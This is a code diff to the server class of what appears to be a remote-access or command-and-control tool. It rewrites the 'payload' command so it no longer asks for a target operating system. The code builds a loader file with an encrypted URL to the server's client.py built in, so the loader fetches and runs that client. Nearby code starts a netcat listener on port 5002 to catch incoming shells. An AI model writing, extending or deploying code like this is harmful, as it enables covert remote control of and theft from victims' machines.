@@ -97,8 +97,8 @@ class server():
             },
             'payload' : {
                 'method' : self._payload,
-                'use' : 'payload < win || linux >',
-                'desc' : 'generate a payload for windows or linux'
+                'use' : 'payload ',
+                'desc' : 'generate a payload'
             },
             'modules': {
                 'method' : self._modules,
@@ -225,17 +225,12 @@ class server():
         os.system('nc -lvnp 5002')
 
         
-    def _payload(self,system):
-        if system == "linux":
-            payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
-            url = self.url + "/client.py"
-            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
-        elif system == "win":
-            payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
-            url = self.url + "/win_client.py"
-            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
-        else:
-            helpers.show("GIVE VALID OPERATING SYSTEM (win or linux)", colour="RED", style="BRIGHT", end="\n")   
+    def _payload(self,):
+        
+        payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
+        url = self.url + "/client.py"
+        helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
+          
 
         
         helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')
